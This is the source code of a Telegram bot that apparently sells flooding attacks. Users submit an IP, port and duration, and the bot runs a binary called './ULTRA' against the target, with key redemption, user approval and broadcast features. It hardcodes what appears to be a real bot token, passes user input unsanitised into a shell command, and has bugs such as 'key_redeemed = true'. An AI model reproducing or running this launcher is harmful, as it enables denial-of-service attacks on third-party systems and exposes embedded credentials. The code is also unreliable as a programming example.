import os
import asyncio
import secrets  # For generating secure random keys
import time  # For tracking redemption time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
from telegram.error import TelegramError

# Replace with your bot token from BotFather
TELEGRAM_BOT_TOKEN = '7718765612:AAEsrz7uXxsq_aDoPjncPdOD73z3WLOEVz0'
ALLOWED_USER_ID = 6135948216  # Admin user ID
bot_access_free = True  

# In-memory storage for the generated key, redemption status, and user interactions
generated_key = None
key_redeemed = true
redeem_time = None  # Timestamp of key redemption
user_ids = set()  # Set to store unique user IDs who interacted with the bot
approved_users = set()  # Set of users who have been approved

# Handlers for commands

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user interacting with the bot

    # Track the user ID
    user_ids.add(user_id)

    # Create inline keyboard with buttons
    keyboard = [
        [InlineKeyboardButton("Launch Attack", callback_data='launch_attack')],
        [InlineKeyboardButton("Check Status", callback_data='check_status')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use the buttons below to proceed!*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown', reply_markup=reply_markup)

async def handle_button(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    # Handle different button presses based on callback_data
    if query.data == 'launch_attack':
        # Ask for the target IP, port, and duration
        await query.edit_message_text(
            text="*⚔️ Enter the details for the attack:*\n*Format: /attack <ip> <port> <duration>*",
            parse_mode='Markdown'
        )
    elif query.data == 'check_status':
        # Show the status of the key and redemption
        await status(update, context)

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def genkey(update: Update, context: CallbackContext):
    global generated_key  # Reference the global generated_key variable

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Generate a secure random key
    generated_key = secrets.token_urlsafe(16)  # Generates a 16-byte secure token (alphanumeric)
    
    # Reset redemption status and time
    global key_redeemed, redeem_time
    key_redeemed = False
    redeem_time = None  # Reset the redemption time

    # Send the generated key to the admin
    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Your generated key: {generated_key}*", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    global generated_key, key_redeemed, redeem_time  # Reference the global variables

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user redeeming the key

    # Ensure the key exists and has not already been redeemed
    if not generated_key:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')
        return

    if key_redeemed:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has already been redeemed!*", parse_mode='Markdown')
        return

    # Redeem the key
    key_redeemed = True
    redeem_time = time.time()  # Store the redemption time

    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Key redeemed successfully!* Your key: {generated_key}", parse_mode='Markdown')

# The 'status' function you requested
async def status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user requesting the status

    # Check if the user is authorized to view the status
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You are not authorized to use this command!*",
            parse_mode='Markdown'
        )
        return

    # Show current status of key and redemption
    if not generated_key:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ No key has been generated yet!*",
            parse_mode='Markdown'
        )
    else:
        redemption_status = "Redeemed" if key_redeemed else "Not redeemed"
        redeem_time_msg = (
            f"\n*⌛ Redeemed at: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(redeem_time))}*"
            if key_redeemed else ""
        )
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*🔑 Current Key: {generated_key}*\n"
                f"*Status: {redemption_status}*"
                f"{redeem_time_msg}"
            ),
            parse_mode='Markdown'
        )

# Admin commands for approving or disapproving users
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must specify a user ID to approve!*", parse_mode='Markdown')
        return

    target_user_id = context.args[0]

    if target_user_id not in user_ids:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User ID {target_user_id} not found!*", parse_mode='Markdown')
        return

    approved_users.add(target_user_id)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User ID {target_user_id} approved!*", parse_mode='Markdown')

async def disapprove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must specify a user ID to disapprove!*", parse_mode='Markdown')
        return

    target_user_id = context.args[0]

    if target_user_id not in user_ids:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User ID {target_user_id} not found!*", parse_mode='Markdown')
        return

    if target_user_id in approved_users:
        approved_users.remove(target_user_id)
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ User ID {target_user_id} disapproved!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User ID {target_user_id} is not approved!*", parse_mode='Markdown')

# Admin command for broadcasting a message
async def broadcast(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You must provide a message to broadcast!*", parse_mode='Markdown')
        return

    broadcast_message = ' '.join(context.args)  # Join all arguments to form the message

    for user_id in user_ids:
        try:
            await context.bot.send_message(user_id, broadcast_message)
        except TelegramError as e:
            print(f"Failed to send broadcast to {user_id}: {e}")

    await context.bot.send_message(chat_id=chat_id, text="*📢 Broadcast message sent to all users!*", parse_mode='Markdown')

def main():
    """Start the bot and set up the handlers."""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('attack', attack))
    application.add_handler(CommandHandler('genkey', genkey))
    application.add_handler(CommandHandler('redeem', redeem))
    application.add_handler(CommandHandler('status', status))
    application.add_handler(CommandHandler('approve', approve))
    application.add_handler(CommandHandler('disapprove', disapprove))
    application.add_handler(CommandHandler('broadcast', broadcast))  # Add broadcast command

    application.run_polling()

if __name__ == "__main__":
    main()
